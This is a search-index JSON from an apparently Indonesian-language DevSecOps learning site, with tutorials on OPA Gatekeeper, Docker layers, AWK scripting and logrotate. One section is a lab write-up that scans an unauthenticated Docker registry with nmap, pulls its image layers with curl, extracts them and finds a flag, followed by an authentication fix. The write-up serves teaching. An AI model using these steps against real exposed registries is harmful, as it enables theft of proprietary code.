{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Welcome to my Journey to DevSecOps","title":"Home"},{"location":"#welcome-to-my-journey-to-devsecops","text":"","title":"Welcome to my Journey to DevSecOps"},{"location":"containers/containers-sec/insecure-docker-registry/","text":"Insecure Docker Registry Apa itu docker registry Docker registry merupakan sebuah aplikasi yang digunakan untuk menyimpan container image. Docker registry biasanya dideploy diatas docker engine sendiri atau sebagai container. Banyak sekali perusahaan memanfaatkan registry secara public untuk mempermudah pekerjaan mereka bahkan kalau kalian melakukan pencarian menggunakan mesin sodan, kalian bisa menemukan banyak sekali image registry yang terekspose ke internet. Tentu tidak semua image registry tersebut bisa kita eksploitasi dengan mudah. Sekarang saya akan membahas sebuah lab yang disediakan oleh pentester academy. Environment Lab docker registry : 192.111.246.3 attacker : 192.111.246.2 Gather Information Scan target menggunakan nmap, because why not :) root@attackdefense:~# nmap -p- -sV 192.111.246.3 Starting Nmap 7.70 ( https://nmap.org ) at 2020-10-01 03:09 UTC Nmap scan report for target-1 (192.111.246.3) Host is up (0.000014s latency). Not shown: 65534 closed ports PORT STATE SERVICE VERSION 5000/tcp open http Docker Registry (API: 2.0) MAC Address: 02:42:C0:6F:F6:03 (Unknown) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 38.14 seconds Dari hasil scaning didapatkan port 5000 dengan tipe service http , version Docker Registry (API: 2.0) . Kemudian kita coba interaksi ke API registry menggunakan curl . root@attackdefense:~# curl http://192.111.246.3:5000/v2/_catalog {\"repositories\":[\"treasure-trove\"]} Dari sini kita medapatkan bahwa registry terbuka tanpa perlu authentikasi. Extract container images Dari informasi yang kita dapatkan, kita coba extract image treasure-trove . Terlebih dahulu list tags dari image tersebut untuk memastikan apabila ada image dengan tags lain yang mungkin lebih menarik. root@attackdefense:~# curl http://192.111.246.3:5000/v2/treasure-trove/tags/list {\"name\":\"treasure-trove\",\"tags\":[\"latest\"]} Ternyata hanya ada tag latest. Kemudian kita extract manifest dari image tersebut. root@attackdefense:~# curl http://192.111.246.3:5000/v2/treasure-trove/manifests/latest { \"schemaVersion\": 1, \"name\": \"treasure-trove\", \"tag\": \"latest\", \"architecture\": \"amd64\", \"fsLayers\": [ { \"blobSum\": \"sha256:2a62ecb2a3e5bcdbac8b6edc58fae093a39381e05d08ca75ed27cae94125f935\" }, { \"blobSum\": \"sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4\" }, { \"blobSum\": \"sha256:e7c96db7181be991f19a9fb6975cdbbd73c65f4a2681348e63a141a2192a5f10\" } ], Dari informasi blobSum ini kita bisa download image tersebut. root@attackdefense:~# curl -s http://192.111.246.3:5000/v2/treasure-trove/blobs/sha256:2a62ecb2a3e5bcdbac8b6edc58fae093a39381e05d08ca75ed27cae94125f935 --output 1.tar root@attackdefense:~# curl -s http://192.111.246.3:5000/v2/treasure-trove/blobs/sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4 --output 2.tar root@attackdefense:~# curl -s http://192.111.246.3:5000/v2/treasure-trove/blobs/sha256:e7c96db7181be991f19a9fb6975cdbbd73c65f4a2681348e63a141a2192a5f10 --output 3.tar root@attackdefense:~# ls 1.tar 2.tar 3.tar Extract image yang sudah didownload. root@attackdefense:~# mkdir image root@attackdefense:~# mv *.tar image root@attackdefense:~# cd image/ root@attackdefense:~/image# for i in 1 2 3; do tar -xf $i.tar; done root@attackdefense:~/image# ls 1.tar 2.tar 3.tar bin dev etc home lib media mnt opt proc root run sbin srv sys tmp usr var root@attackdefense:~/image# Find the flag root@attackdefense:~/image# find . -name *flag* 2> /dev/null ./etc/network/if-post-up.d/flag.txt root@attackdefense:~/image# cat etc/network/if-post-up.d/flag.txt c09f6e2ecff56dcae50c02c6a4d355fe root@attackdefense:~/image# OK flag sudah ketemu.. Untuk real casenya kalian bisa mendapatkan source code aplikasi yang merupakan proprietary suatu organisasi. Penanganan Kalian bisa mengaplikasikan authentikasi di docker registry kalian. token: realm: token-realm service: token-service issuer: registry-token-issuer rootcertbundle: /root/certs/bundle htpasswd: realm: basic-realm path: /path/to/htpasswd source : https://docs.docker.com/registry/configuration/#auth","title":"Insecure Docker Registry"},{"location":"containers/containers-sec/insecure-docker-registry/#insecure-docker-registry","text":"","title":"Insecure Docker Registry"},{"location":"containers/containers-sec/insecure-docker-registry/#apa-itu-docker-registry","text":"Docker registry merupakan sebuah aplikasi yang digunakan untuk menyimpan container image. Docker registry biasanya dideploy diatas docker engine sendiri atau sebagai container. Banyak sekali perusahaan memanfaatkan registry secara public untuk mempermudah pekerjaan mereka bahkan kalau kalian melakukan pencarian menggunakan mesin sodan, kalian bisa menemukan banyak sekali image registry yang terekspose ke internet. Tentu tidak semua image registry tersebut bisa kita eksploitasi dengan mudah. Sekarang saya akan membahas sebuah lab yang disediakan oleh pentester academy.","title":"Apa itu docker registry"},{"location":"containers/containers-sec/insecure-docker-registry/#environment-lab","text":"docker registry : 192.111.246.3 attacker : 192.111.246.2","title":"Environment Lab"},{"location":"containers/containers-sec/insecure-docker-registry/#gather-information","text":"Scan target menggunakan nmap, because why not :) root@attackdefense:~# nmap -p- -sV 192.111.246.3 Starting Nmap 7.70 ( https://nmap.org ) at 2020-10-01 03:09 UTC Nmap scan report for target-1 (192.111.246.3) Host is up (0.000014s latency). Not shown: 65534 closed ports PORT STATE SERVICE VERSION 5000/tcp open http Docker Registry (API: 2.0) MAC Address: 02:42:C0:6F:F6:03 (Unknown) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 38.14 seconds Dari hasil scaning didapatkan port 5000 dengan tipe service http , version Docker Registry (API: 2.0) . Kemudian kita coba interaksi ke API registry menggunakan curl . root@attackdefense:~# curl http://192.111.246.3:5000/v2/_catalog {\"repositories\":[\"treasure-trove\"]} Dari sini kita medapatkan bahwa registry terbuka tanpa perlu authentikasi.","title":"Gather Information"},{"location":"containers/containers-sec/insecure-docker-registry/#extract-container-images","text":"Dari informasi yang kita dapatkan, kita coba extract image treasure-trove . Terlebih dahulu list tags dari image tersebut untuk memastikan apabila ada image dengan tags lain yang mungkin lebih menarik. root@attackdefense:~# curl http://192.111.246.3:5000/v2/treasure-trove/tags/list {\"name\":\"treasure-trove\",\"tags\":[\"latest\"]} Ternyata hanya ada tag latest. Kemudian kita extract manifest dari image tersebut. root@attackdefense:~# curl http://192.111.246.3:5000/v2/treasure-trove/manifests/latest { \"schemaVersion\": 1, \"name\": \"treasure-trove\", \"tag\": \"latest\", \"architecture\": \"amd64\", \"fsLayers\": [ { \"blobSum\": \"sha256:2a62ecb2a3e5bcdbac8b6edc58fae093a39381e05d08ca75ed27cae94125f935\" }, { \"blobSum\": \"sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4\" }, { \"blobSum\": \"sha256:e7c96db7181be991f19a9fb6975cdbbd73c65f4a2681348e63a141a2192a5f10\" } ], Dari informasi blobSum ini kita bisa download image tersebut. root@attackdefense:~# curl -s http://192.111.246.3:5000/v2/treasure-trove/blobs/sha256:2a62ecb2a3e5bcdbac8b6edc58fae093a39381e05d08ca75ed27cae94125f935 --output 1.tar root@attackdefense:~# curl -s http://192.111.246.3:5000/v2/treasure-trove/blobs/sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4 --output 2.tar root@attackdefense:~# curl -s http://192.111.246.3:5000/v2/treasure-trove/blobs/sha256:e7c96db7181be991f19a9fb6975cdbbd73c65f4a2681348e63a141a2192a5f10 --output 3.tar root@attackdefense:~# ls 1.tar 2.tar 3.tar Extract image yang sudah didownload. root@attackdefense:~# mkdir image root@attackdefense:~# mv *.tar image root@attackdefense:~# cd image/ root@attackdefense:~/image# for i in 1 2 3; do tar -xf $i.tar; done root@attackdefense:~/image# ls 1.tar 2.tar 3.tar bin dev etc home lib media mnt opt proc root run sbin srv sys tmp usr var root@attackdefense:~/image#","title":"Extract container images"},{"location":"containers/containers-sec/insecure-docker-registry/#find-the-flag","text":"root@attackdefense:~/image# find . -name *flag* 2> /dev/null ./etc/network/if-post-up.d/flag.txt root@attackdefense:~/image# cat etc/network/if-post-up.d/flag.txt c09f6e2ecff56dcae50c02c6a4d355fe root@attackdefense:~/image# OK flag sudah ketemu.. Untuk real casenya kalian bisa mendapatkan source code aplikasi yang merupakan proprietary suatu organisasi.","title":"Find the flag"},{"location":"containers/containers-sec/insecure-docker-registry/#penanganan","text":"Kalian bisa mengaplikasikan authentikasi di docker registry kalian. token: realm: token-realm service: token-service issuer: registry-token-issuer rootcertbundle: /root/certs/bundle htpasswd: realm: basic-realm path: /path/to/htpasswd source : https://docs.docker.com/registry/configuration/#auth","title":"Penanganan"},{"location":"containers/containers-sec/opa-gatekeeper/","text":"OPA Gatekeeper admission controllers require spesific labels on all resources require container image come from the coorporate image registry require all pods specify resource request and limits prevent conflicting ingress object from being created Install gatekeeper kubectl apply -f https://raw.githubusercontent.com/open-policy-agent/gatekeeper/release-3.4/deploy/gatekeeper.yaml Gatekeeper menggunakan OPA Constraint framework untuk mendefinisikan policy. Constraint Constraint merupakan suatu difinisi agar suatu sistem memenuhi requirement dari author. ex. apiVersion: constraints.gatekeeper.sh/v1beta1 kind: FooSystemRequiredLabel metadata: name: require-billing-label spec: match: namespace: [\"expensive\"] parameters: labels: [\"billing\"] ketika constraint tersebut dideklarasikan, maka setiap resources yang ada pada namespace expensive diharuskan mempunyai label billing . Constraint Template Constraint template merupakan template yang nantinya digunakan oleh constraint untuk mendefinisikan policy. ex. apiVersion: templates.gatekeeper.sh/v1beta1 kind: ConstraintTemplate metadata: name: k8srequiredlabels spec: crd: spec: names: kind: K8sRequiredLabels validation: # Schema for the `parameters` field openAPIV3Schema: properties: labels: type: array items: string targets: - target: admission.k8s.gatekeeper.sh rego: | package k8srequiredlabels violation[{\"msg\": msg, \"details\": {\"missing_labels\": missing}}] { provided := {label | input.review.object.metadata.labels[label]} required := {label | label := input.parameters.labels[_]} missing := required - provided count(missing) > 0 msg := sprintf(\"you must provide labels: %v\", [missing]) } Constraint template diatas merupakan definisi template yang digunakan oleh constraint sebelumnya, yang mengharuskan resource yang ada di suatu namespace mempunyai spesifik label. Demo : 1. Create ConstraintTemplate. vim ct-req-labels.yaml ... apiVersion: templates.gatekeeper.sh/v1beta1 kind: ConstraintTemplate metadata: name: k8srequiredlabels spec: crd: spec: names: kind: K8sRequiredLabels validation: # Schema for the `parameters` field openAPIV3Schema: properties: labels: type: array items: string targets: - target: admission.k8s.gatekeeper.sh rego: | package k8srequiredlabels violation[{\"msg\": msg, \"details\": {\"missing_labels\": missing}}] { provided := {label | input.review.object.metadata.labels[label]} required := {label | label := input.parameters.labels[_]} missing := required - provided count(missing) > 0 msg := sprintf(\"you must provide labels: %v\", [missing]) } ... Apply definition kubectl apply -f ct-req-labels.yaml Create Constraint. vim c-req-label.yaml ... apiVersion: constraints.gatekeeper.sh/v1beta1 kind: K8sRequiredLabels metadata: name: ns-must-have-gk spec: match: kinds: - apiGroups: [\"\"] kinds: [\"Namespace\"] parameters: labels: [\"name: gatekeeper\"] ... Apply definition kubectl apply -f c-req-label.yaml Constraint diatas akan membatasi pada saat kita membuat namespace. namespace yang dibuat harus mempunyai label gatekeeper # kubectl create ns ci-cd ... Error from server ([ns-must-have-gk] you must provide labels: {\"gatekeeper\"}): admission webhook \"validation.gatekeeper.sh\" denied the request: [ns-must-have-gk] you must provide labels: {\"gatekeeper\"} ... apiVersion: templates.gatekeeper.sh/v1beta1 kind: ConstraintTemplate metadata: name: privilegedcontainer spec: crd: spec: names: kind: PrivilegedContainer targets: - target: admission.k8s.gatekeeper.sh rego: | package privilegedcontainer violation[{\"msg\": msg, \"details\": {}}]{ c := input_containers[_] c.securityContext.privileged msg := sprintf(\"Privileged container is not allowed: %v, securityContext: %v, [c.name, c.securityContext]\") } input_containers[c]{ c := input.review.object.spec.containers[_] } input_containers[c]{ c := input.review.object.spec.initContainers[_] } apiVersion: constraint.gatekeeper.sh/v1beta1 kind: PrivilegedContainer metadata: name: privilegedcontainer spec: match: kinds: - apiGroups: [\"\"] apiVersion: [\"v1\"] kinds: [\"Pod\"]","title":"Opa gatekeeper"},{"location":"containers/containers-sec/opa-gatekeeper/#opa-gatekeeper","text":"admission controllers require spesific labels on all resources require container image come from the coorporate image registry require all pods specify resource request and limits prevent conflicting ingress object from being created Install gatekeeper kubectl apply -f https://raw.githubusercontent.com/open-policy-agent/gatekeeper/release-3.4/deploy/gatekeeper.yaml Gatekeeper menggunakan OPA Constraint framework untuk mendefinisikan policy.","title":"OPA Gatekeeper"},{"location":"containers/containers-sec/opa-gatekeeper/#constraint","text":"Constraint merupakan suatu difinisi agar suatu sistem memenuhi requirement dari author. ex. apiVersion: constraints.gatekeeper.sh/v1beta1 kind: FooSystemRequiredLabel metadata: name: require-billing-label spec: match: namespace: [\"expensive\"] parameters: labels: [\"billing\"] ketika constraint tersebut dideklarasikan, maka setiap resources yang ada pada namespace expensive diharuskan mempunyai label billing .","title":"Constraint"},{"location":"containers/containers-sec/opa-gatekeeper/#constraint-template","text":"Constraint template merupakan template yang nantinya digunakan oleh constraint untuk mendefinisikan policy. ex. apiVersion: templates.gatekeeper.sh/v1beta1 kind: ConstraintTemplate metadata: name: k8srequiredlabels spec: crd: spec: names: kind: K8sRequiredLabels validation: # Schema for the `parameters` field openAPIV3Schema: properties: labels: type: array items: string targets: - target: admission.k8s.gatekeeper.sh rego: | package k8srequiredlabels violation[{\"msg\": msg, \"details\": {\"missing_labels\": missing}}] { provided := {label | input.review.object.metadata.labels[label]} required := {label | label := input.parameters.labels[_]} missing := required - provided count(missing) > 0 msg := sprintf(\"you must provide labels: %v\", [missing]) } Constraint template diatas merupakan definisi template yang digunakan oleh constraint sebelumnya, yang mengharuskan resource yang ada di suatu namespace mempunyai spesifik label. Demo : 1. Create ConstraintTemplate. vim ct-req-labels.yaml ... apiVersion: templates.gatekeeper.sh/v1beta1 kind: ConstraintTemplate metadata: name: k8srequiredlabels spec: crd: spec: names: kind: K8sRequiredLabels validation: # Schema for the `parameters` field openAPIV3Schema: properties: labels: type: array items: string targets: - target: admission.k8s.gatekeeper.sh rego: | package k8srequiredlabels violation[{\"msg\": msg, \"details\": {\"missing_labels\": missing}}] { provided := {label | input.review.object.metadata.labels[label]} required := {label | label := input.parameters.labels[_]} missing := required - provided count(missing) > 0 msg := sprintf(\"you must provide labels: %v\", [missing]) } ... Apply definition kubectl apply -f ct-req-labels.yaml Create Constraint. vim c-req-label.yaml ... apiVersion: constraints.gatekeeper.sh/v1beta1 kind: K8sRequiredLabels metadata: name: ns-must-have-gk spec: match: kinds: - apiGroups: [\"\"] kinds: [\"Namespace\"] parameters: labels: [\"name: gatekeeper\"] ... Apply definition kubectl apply -f c-req-label.yaml Constraint diatas akan membatasi pada saat kita membuat namespace. namespace yang dibuat harus mempunyai label gatekeeper # kubectl create ns ci-cd ... Error from server ([ns-must-have-gk] you must provide labels: {\"gatekeeper\"}): admission webhook \"validation.gatekeeper.sh\" denied the request: [ns-must-have-gk] you must provide labels: {\"gatekeeper\"} ... apiVersion: templates.gatekeeper.sh/v1beta1 kind: ConstraintTemplate metadata: name: privilegedcontainer spec: crd: spec: names: kind: PrivilegedContainer targets: - target: admission.k8s.gatekeeper.sh rego: | package privilegedcontainer violation[{\"msg\": msg, \"details\": {}}]{ c := input_containers[_] c.securityContext.privileged msg := sprintf(\"Privileged container is not allowed: %v, securityContext: %v, [c.name, c.securityContext]\") } input_containers[c]{ c := input.review.object.spec.containers[_] } input_containers[c]{ c := input.review.object.spec.initContainers[_] } apiVersion: constraint.gatekeeper.sh/v1beta1 kind: PrivilegedContainer metadata: name: privilegedcontainer spec: match: kinds: - apiGroups: [\"\"] apiVersion: [\"v1\"] kinds: [\"Pod\"]","title":"Constraint Template"},{"location":"containers/containers-sec/trivy/","text":"Scaning Vulnerability dengan Trivy pada Github Action Docker Image Image pada container dibangun berdasarkan serangkaian layer. Layer ini mewakili instruksi pada Dockerfile. FROM ubuntu:18.04 COPY . /app RUN make /app CMD python /app/app.py Dockerfile diatas tersusun dari 3 layer image Container and Image Apa itu trivy Environment Lab","title":"Scaning Vulnerability dengan Trivy pada Github Action"},{"location":"containers/containers-sec/trivy/#scaning-vulnerability-dengan-trivy-pada-github-action","text":"","title":"Scaning Vulnerability dengan Trivy pada Github Action"},{"location":"containers/containers-sec/trivy/#docker-image","text":"Image pada container dibangun berdasarkan serangkaian layer. Layer ini mewakili instruksi pada Dockerfile. FROM ubuntu:18.04 COPY . /app RUN make /app CMD python /app/app.py Dockerfile diatas tersusun dari 3 layer image","title":"Docker Image"},{"location":"containers/containers-sec/trivy/#container-and-image","text":"","title":"Container and Image"},{"location":"containers/containers-sec/trivy/#apa-itu-trivy","text":"","title":"Apa itu trivy"},{"location":"containers/containers-sec/trivy/#environment-lab","text":"","title":"Environment Lab"},{"location":"containers/containers-sec/trivy/#_1","text":"","title":""},{"location":"linux-fun/awk/","text":"Basic Bash Scripting Menggunakan AWK Apa itu AWK AWK atau GAWK (GNU awk) merupakan tools text processing yang sangat powerfull. Selain untuk text processing gawk juga dapat dimanfaatkan untuk mempermudah kita untuk melakukan automasi, config dan lain sebagainya. Bekerja menggunakan AWK Sebelum memulai menggunakan awk, adabaiknya kita membaca dokumentasinya terlebih dahulu. Untuk melihat dokumentasi atau man page dari awk menggunakan perintah sebagai berikut : man awk Contoh penggunaan awk Ada 2 file yang digunakan untuk contoh a.txt ID Nama Gender Age Hobby 1 Udin Male 22 Mancing 2 Samsul Male 13 Berenang 3 Vina Female 23 Memasak 4 Sri Female 15 Olahraga b.csv ID,Nama,Gender,Age,Hobby 1,Udin,Male,22,Mancing 2,Samsul,Male,13,Berenang 3,Vina,Female,23,Memasak 4,Sri,Female,15,Olahraga Versi awk Command : awk --version Output : GNU Awk 4.1.4, API: 1.1 (GNU MPFR 4.0.1, GNU MP 6.1.2) Copyright (C) 1989, 1991-2016 Free Software Foundation. This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation; either version 3 of the License, or (at your option) any later version. This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details. You should have received a copy of the GNU General Public License along with this program. If not, see http://www.gnu.org/licenses/. Ekstraksi kolom Perintah berikut digunakan untuk melakukan ekstraksi kolom pertama dari file dengan delimiter default (whitespace/spasi/tab) a.txt Command : awk '{print $1}' a.txt Output : ID 1 2 3 4 Penjelasan : | awk | '{print $1}' | a.txt | |-|-|-| |awk command|print kolom pertama|nama file| Berikut contoh ekstrasi kolom menggunakan delimiter koma pada file b.csv Command : awk -F ',' '{print $2}' b.csv Output : Nama Udin Samsul Vina Sri Penjelasan : | awk | -F | ',' | '{print $2}' | a.txt | |-|-|-|-|-| |awk command|menentukan delimiter|delimiter|print kolom kedua|nama file| Ekstrak & Construct Seelah belajar cara melakukan ekstraksi kolom, kita juga dapat memodifikasi output yang kita inginkan, sebagai contoh : Command : awk -F ',' '{print \"Hallo \"$2\" hobby saya \"$5}' b.csv Output : Hallo Nama hobby saya Hobby Hallo Udin hobby saya Mancing Hallo Samsul hobby saya Berenang Hallo Vina hobby saya Memasak Hallo Sri hobby saya Olahraga Penjelasan : | '{print | \"Hallo \" | $2 | \" hobby saya \" | $5}' | |-|-|-|-|-| |print|string tambahan|kolom ke-2|string tambahan|kolom ke-5| Mencari string Command : awk '/Samsul/' a.txt Output : 2 Samsul Male 13 Berenang Penjelasan | awk | '/Samsul/' | a.txt | |-|-|-| |awk|String yang dicari|Nama file| Automasi Konfigurasi Hostame dari file csv Task kali ini kita ditugaskan untuk setting hostname di beberapa server yang akan digunakan untuk deployment aplikasi, kita diberikan satu file server.csv yang berisi informasi server. Untuk format hostnamenya adalah sebagai berikut : Region-Type-Host ex : JKT-HPE-DL380-worker File csv : IP,Type,Host,Region 192.168.30.12,HPE-DL380,controller,JKT 192.168.30.14,HPE-DL380,worker,JKT 192.168.30.15,HPE-DL380,worker,BGR 192.168.30.16,HPE-DL380,worker,BGD Pertama kita coba generate hostname dan IP terlebih dahulu. Command : awk -F ',' '{print $1\" \"$4\"-\"$2\"-\"$3}' server.csv Output : IP Region-Type-Host 192.168.30.12 JKT-HPE-DL380-controller 192.168.30.14 JKT-HPE-DL380-worker 192.168.30.15 BGR-HPE-DL380-worker 192.168.30.16 BGD-HPE-DL380-worker Untuk konfigurasi /etc/hosts kita harus menghilangkan header IP Region-Type-Host . Kita bisa memanfaatkan fitur search string untuk mengeliminasi string tersebut. Command : awk -F ',' '/192/{print $1\" \"$4\"-\"$2\"-\"$3}' server.csv Output : 192.168.30.12 JKT-HPE-DL380-controller 192.168.30.14 JKT-HPE-DL380-worker 192.168.30.15 BGR-HPE-DL380-worker 192.168.30.16 BGD-HPE-DL380-worker Sekarang untuk menandakan konfigurasi ini digereate oleh awk kita dapat memanfaatkan statmen BEGIN . Command : awk -F ',' 'BEGIN{print \"#Generated by awk\"}/192/{print $1\" \"$4\"-\"$2\"-\"$3}' server.csv Output : #Generated by awk 192.168.30.12 JKT-HPE-DL380-controller 192.168.30.14 JKT-HPE-DL380-worker 192.168.30.15 BGR-HPE-DL380-worker 192.168.30.16 BGD-HPE-DL380-worker Sekarang kita aplikasikan konfigurasi tersebut ke file /etc/hosts ke server. Buat file hostname.sh vim hostname.sh Masukan script berikut untuk generate dan apply config ke server. #!/bin/bash ## Generate config FILE=server.csv awk -F ',' 'BEGIN{print \"#Generated by awk\"}/192/{print $1\" \"$4\"-\"$2\"-\"$3}' $FILE > config ## Apply config using ssh for i in $(awk -F ',' '/192/{print $1}' $FILE); do echo \"Configuring $i\"; echo \"cat config | ssh root@$i 'cat >> /etc/hosts'\"; done Ubah permission untuk eksekusi chmod 760 hostname.sh Eksekusi script ./hostname.sh Output : Configuring 192.168.30.12 Configuring 192.168.30.14 Configuring 192.168.30.15 Configuring 192.168.30.16 Optimasi script Ubah variable $FILE menjadi argument agar eksekusi script menjadi ./hostname.sh nama-file.csv","title":"Basic Bash Scripting - AWK"},{"location":"linux-fun/awk/#basic-bash-scripting-menggunakan-awk","text":"","title":"Basic Bash Scripting Menggunakan AWK"},{"location":"linux-fun/awk/#apa-itu-awk","text":"AWK atau GAWK (GNU awk) merupakan tools text processing yang sangat powerfull. Selain untuk text processing gawk juga dapat dimanfaatkan untuk mempermudah kita untuk melakukan automasi, config dan lain sebagainya.","title":"Apa itu AWK"},{"location":"linux-fun/awk/#bekerja-menggunakan-awk","text":"Sebelum memulai menggunakan awk, adabaiknya kita membaca dokumentasinya terlebih dahulu. Untuk melihat dokumentasi atau man page dari awk menggunakan perintah sebagai berikut : man awk","title":"Bekerja menggunakan AWK"},{"location":"linux-fun/awk/#contoh-penggunaan-awk","text":"Ada 2 file yang digunakan untuk contoh a.txt ID Nama Gender Age Hobby 1 Udin Male 22 Mancing 2 Samsul Male 13 Berenang 3 Vina Female 23 Memasak 4 Sri Female 15 Olahraga b.csv ID,Nama,Gender,Age,Hobby 1,Udin,Male,22,Mancing 2,Samsul,Male,13,Berenang 3,Vina,Female,23,Memasak 4,Sri,Female,15,Olahraga","title":"Contoh penggunaan awk"},{"location":"linux-fun/awk/#versi-awk","text":"Command : awk --version Output : GNU Awk 4.1.4, API: 1.1 (GNU MPFR 4.0.1, GNU MP 6.1.2) Copyright (C) 1989, 1991-2016 Free Software Foundation. This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation; either version 3 of the License, or (at your option) any later version. This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details. You should have received a copy of the GNU General Public License along with this program. If not, see http://www.gnu.org/licenses/.","title":"Versi awk"},{"location":"linux-fun/awk/#ekstraksi-kolom","text":"Perintah berikut digunakan untuk melakukan ekstraksi kolom pertama dari file dengan delimiter default (whitespace/spasi/tab) a.txt Command : awk '{print $1}' a.txt Output : ID 1 2 3 4 Penjelasan : | awk | '{print $1}' | a.txt | |-|-|-| |awk command|print kolom pertama|nama file| Berikut contoh ekstrasi kolom menggunakan delimiter koma pada file b.csv Command : awk -F ',' '{print $2}' b.csv Output : Nama Udin Samsul Vina Sri Penjelasan : | awk | -F | ',' | '{print $2}' | a.txt | |-|-|-|-|-| |awk command|menentukan delimiter|delimiter|print kolom kedua|nama file|","title":"Ekstraksi kolom"},{"location":"linux-fun/awk/#ekstrak-construct","text":"Seelah belajar cara melakukan ekstraksi kolom, kita juga dapat memodifikasi output yang kita inginkan, sebagai contoh : Command : awk -F ',' '{print \"Hallo \"$2\" hobby saya \"$5}' b.csv Output : Hallo Nama hobby saya Hobby Hallo Udin hobby saya Mancing Hallo Samsul hobby saya Berenang Hallo Vina hobby saya Memasak Hallo Sri hobby saya Olahraga Penjelasan : | '{print | \"Hallo \" | $2 | \" hobby saya \" | $5}' | |-|-|-|-|-| |print|string tambahan|kolom ke-2|string tambahan|kolom ke-5|","title":"Ekstrak &amp; Construct"},{"location":"linux-fun/awk/#mencari-string","text":"Command : awk '/Samsul/' a.txt Output : 2 Samsul Male 13 Berenang Penjelasan | awk | '/Samsul/' | a.txt | |-|-|-| |awk|String yang dicari|Nama file|","title":"Mencari string"},{"location":"linux-fun/awk/#automasi-konfigurasi-hostame-dari-file-csv","text":"Task kali ini kita ditugaskan untuk setting hostname di beberapa server yang akan digunakan untuk deployment aplikasi, kita diberikan satu file server.csv yang berisi informasi server. Untuk format hostnamenya adalah sebagai berikut : Region-Type-Host ex : JKT-HPE-DL380-worker File csv : IP,Type,Host,Region 192.168.30.12,HPE-DL380,controller,JKT 192.168.30.14,HPE-DL380,worker,JKT 192.168.30.15,HPE-DL380,worker,BGR 192.168.30.16,HPE-DL380,worker,BGD Pertama kita coba generate hostname dan IP terlebih dahulu. Command : awk -F ',' '{print $1\" \"$4\"-\"$2\"-\"$3}' server.csv Output : IP Region-Type-Host 192.168.30.12 JKT-HPE-DL380-controller 192.168.30.14 JKT-HPE-DL380-worker 192.168.30.15 BGR-HPE-DL380-worker 192.168.30.16 BGD-HPE-DL380-worker Untuk konfigurasi /etc/hosts kita harus menghilangkan header IP Region-Type-Host . Kita bisa memanfaatkan fitur search string untuk mengeliminasi string tersebut. Command : awk -F ',' '/192/{print $1\" \"$4\"-\"$2\"-\"$3}' server.csv Output : 192.168.30.12 JKT-HPE-DL380-controller 192.168.30.14 JKT-HPE-DL380-worker 192.168.30.15 BGR-HPE-DL380-worker 192.168.30.16 BGD-HPE-DL380-worker Sekarang untuk menandakan konfigurasi ini digereate oleh awk kita dapat memanfaatkan statmen BEGIN . Command : awk -F ',' 'BEGIN{print \"#Generated by awk\"}/192/{print $1\" \"$4\"-\"$2\"-\"$3}' server.csv Output : #Generated by awk 192.168.30.12 JKT-HPE-DL380-controller 192.168.30.14 JKT-HPE-DL380-worker 192.168.30.15 BGR-HPE-DL380-worker 192.168.30.16 BGD-HPE-DL380-worker Sekarang kita aplikasikan konfigurasi tersebut ke file /etc/hosts ke server. Buat file hostname.sh vim hostname.sh Masukan script berikut untuk generate dan apply config ke server. #!/bin/bash ## Generate config FILE=server.csv awk -F ',' 'BEGIN{print \"#Generated by awk\"}/192/{print $1\" \"$4\"-\"$2\"-\"$3}' $FILE > config ## Apply config using ssh for i in $(awk -F ',' '/192/{print $1}' $FILE); do echo \"Configuring $i\"; echo \"cat config | ssh root@$i 'cat >> /etc/hosts'\"; done Ubah permission untuk eksekusi chmod 760 hostname.sh Eksekusi script ./hostname.sh Output : Configuring 192.168.30.12 Configuring 192.168.30.14 Configuring 192.168.30.15 Configuring 192.168.30.16","title":"Automasi Konfigurasi Hostame dari file csv"},{"location":"linux-fun/awk/#optimasi-script","text":"Ubah variable $FILE menjadi argument agar eksekusi script menjadi ./hostname.sh nama-file.csv","title":"Optimasi script"},{"location":"linux-fun/logrotate/","text":"Manajemen Log Menggunakan Logrotate Apa itu logrotate? Menurut manual page dari logrotate man logrotate , Logrotate adalah sebuah program yang berfungsi untuk mengotomatissai proses rotasi, kompresi, dan penghapusan log file. Logrotate menghandle (rotate, compress, delete) file log secara satuan waktu (daily, weekly, monthly), atau ukuran besar log. Bagaimana Logrotate Bekerja? Logrotate bekerja dengan memanfaatkan file konfigurasi yang bisa kita kustomisasi /etc/logrotate.conf . Dalam file konfigurasi kita bisa mengatur berapa lama kita menyimpan log tersebut sebelum log tersebut akan otomatis terhapus. Selain itu kita bisa mengatus agar file log yang ada dirotasi berdasarkan satuan waktu (daily, weekly, monthly). Contoh : log file yang dirotate setiap hari selama 7 hari. # ls /var/log syslog syslog.1 syslog.2.gz syslog.3.gz syslog.4.gz syslog.5.gz syslog.6.gz Log akan dirotate, kemudian di-compress dan setelah 7 hari maka log akan otomatis dihapus. Installasi Kebanyakan distribusi linux sudah terinstall logrotate secara default. Tapi jika di sistem linux kalian belum terinstall, logrotate bisa diinstall dengan perintah : RHEL/CentOS sudo yum -y install logrotate Debian/Ubuntu sudo apt -y install logrotate Fedora sudo dnf install logrotate Konfigurasi Contoh file konfigurasi logrotate untuk log httpd access.log & error.log . compress \"/var/log/httpd/access.log\" /var/log/httpd/error.log { rotate 5 mail recipient@example.org size 100k sharedscripts postrotate /usr/bin/killall -HUP httpd endscript } Penjelasan compress Baris pertama merupakan global options. Di contoh ini, log akan dicompress setelah log tersebut dirotasi. 